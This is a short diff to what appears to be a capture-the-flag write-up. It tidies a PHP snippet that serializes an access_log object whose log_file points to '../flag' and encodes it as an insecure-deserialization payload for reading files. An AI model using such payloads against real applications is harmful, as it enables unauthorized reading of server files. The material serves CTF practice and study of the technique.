@@ -281,13 +281,12 @@ print(urlencode(base64_encode(serialize("TEST"))))
 
 class access_log
 {
-	public $log_file = "../flag";
-
+    public $log_file = "../flag";
 }
 
 $payload = new access_log();
 
-print(urlencode(base64_encode(serialize($payload))))
+print urlencode(base64_encode(serialize($payload)));
 ?>
 ```
 
